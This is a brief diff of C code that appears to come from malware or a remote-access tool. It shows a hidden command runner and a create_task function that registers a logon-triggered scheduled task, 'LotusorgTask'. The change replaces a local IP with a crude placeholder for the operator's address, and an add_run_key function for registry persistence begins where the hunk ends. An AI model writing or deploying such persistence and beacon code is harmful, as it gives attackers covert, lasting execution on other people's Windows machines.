@@ -15,7 +15,7 @@ void run_command_hidden(const char *cmd) {
 }
 
 void create_task() {
-    run_command_hidden("schtasks /Create /F /SC ONLOGON /TN \"LotusorgTask\" /TR \"cmd /c ping -n 1 192.168.1.100 >nul\"");
+    run_command_hidden("schtasks /Create /F /SC ONLOGON /TN \"LotusorgTask\" /TR \"cmd /c ping -n 1 YOUR.FUCKING.IP >nul\"");
 }
 
 void add_run_key() {
